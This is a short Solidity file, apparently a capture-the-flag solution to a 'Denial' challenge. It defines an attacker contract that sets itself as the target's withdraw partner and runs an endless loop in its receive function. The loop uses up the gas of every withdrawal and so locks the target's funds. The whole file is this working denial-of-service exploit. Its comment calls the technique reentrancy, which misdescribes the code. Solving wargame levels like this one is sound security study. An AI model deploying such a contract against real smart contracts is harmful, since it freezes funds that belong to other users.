// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./denial.sol";

/**
 * this contract will call the withdraw function and do reentrancy in order to loop infinitely and lock it
 */
contract denialAttack {

    // address payable public target;
    Denial public immutable target;
    uint infinite;
    constructor(address payable targetAddress) {
      target = Denial(targetAddress);
      // set the partner as this contract
      target.setWithdrawPartner(address(this));
    }

    // fallback function
  receive() payable external {
    infinite=0;
    while(true) {
      infinite++;
    }
  }
}

